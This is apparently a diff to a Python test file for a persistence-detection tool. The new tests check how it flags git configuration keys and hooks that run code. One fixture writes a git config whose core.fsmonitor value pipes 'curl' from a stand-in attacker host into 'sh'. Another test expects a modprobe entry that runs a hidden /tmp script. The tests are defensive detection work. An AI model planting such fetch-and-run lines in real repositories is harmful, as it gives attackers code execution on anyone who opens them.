@@ -1,7 +1,7 @@
 # Run: python3 tests/test_persistence.py (or pytest)
 import atexit, os, shutil, sys, tempfile
 sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
-from arche.persistence import hooks, chromium_roots, install_cmds
+from arche.persistence import hooks, chromium_roots, install_cmds, git_runs
 
 
 def test_hooks():
@@ -38,5 +38,24 @@ def test_install_cmds():
     assert list(install_cmds(t)) == [('e1000e', '/tmp/.x/run.sh; /sbin/modprobe --ignore-install e1000e')], list(install_cmds(t))
 
 
+def test_git_runs():
+    l = ('core.fsmonitor=true\ncore.fsmonitor=.git/hooks/fsmonitor-watchman\nfilter.lfs.smudge=git-lfs smudge -- %f\n'
+         'filter.x.smudge=./x.sh\ndiff.pdf.textconv=pdftotext\nalias.st=status\nalias.y=!sh y\nremote.origin.url=https://x\n')
+    assert [k for k, _ in git_runs(l)] == ['core.fsmonitor', 'filter.x.smudge', 'diff.pdf.textconv', 'alias.y']
+
+
+def test_repo_git_folder():
+    import arche.ai
+    r, old = tempfile.mkdtemp(), arche.ai.repos; atexit.register(shutil.rmtree, r, True)
+    os.makedirs(f'{r}/.git/hooks')
+    open(f'{r}/.git/config', 'w').write('[core]\n\tfsmonitor = "curl -s https://evil.example/x | sh"\n\tsshCommand = ssh -i ~/.ssh/deploy\n')
+    open(f'{r}/.git/hooks/post-checkout', 'w').write('#!/bin/sh\necho hi\n'); os.chmod(f'{r}/.git/hooks/post-checkout', 0o755)
+    open(f'{r}/.git/hooks/pre-commit.sample', 'w').write('#!/bin/sh\n'); os.chmod(f'{r}/.git/hooks/pre-commit.sample', 0o755)
+    arche.ai.repos = lambda: [r]
+    try: rows = [(t, s) for t, s, _ in hooks() if r in t]
+    finally: arche.ai.repos = old
+    assert [s for _, s in rows] == [1, 0, 0] and 'evil.example' in rows[0][0] and 'post-checkout' in rows[2][0], rows
+
+
 if __name__ == '__main__':
-    test_hooks(); test_custom_chromium_dirs(); test_install_cmds(); print('ok')
+    test_hooks(); test_git_runs(); test_repo_git_folder(); test_custom_chromium_dirs(); test_install_cmds(); print('ok')
